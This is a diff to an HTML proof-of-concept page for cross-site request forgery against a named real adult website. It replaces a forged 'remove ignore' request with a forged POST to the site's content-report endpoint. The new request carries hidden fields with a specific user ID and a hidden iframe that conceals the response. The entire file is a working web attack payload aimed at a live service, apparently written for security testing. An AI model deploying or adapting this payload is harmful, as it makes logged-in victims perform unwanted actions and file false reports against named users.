@@ -1,12 +1,22 @@
+<!DOCTYPE html>
 <html>
   <body>
-    <h3>Click the button to trigger the CSRF request silently.</h3>
+    <h2>CSRF Proof of Concept</h2>
+    <p>Click the button below to submit the forged report:</p>
 
-    <form action="https://www.mydirtyhobby.com/n/removeignore/125165812-Nataliecarterxx/1" method="POST">
-      <button type="submit">Remove Ignore</button>
+    <form id="csrfForm"
+          action="https://www.mydirtyhobby.com/chat/reportcontent"
+          method="POST"
+          enctype="multipart/form-data"
+          target="csrfTarget">
+
+      <input type="hidden" name="reason" value="inappropriateComment">
+      <input type="hidden" name="userId" value="114253502">
+      <input type="hidden" name="jwt" value="">
+
+      <button type="submit">Submit CSRF Request</button>
     </form>
 
-    <p><i>Victim Ignore List change.</i></p>
+    <iframe name="csrfTarget" style="display:none;"></iframe>
   </body>
 </html>
-
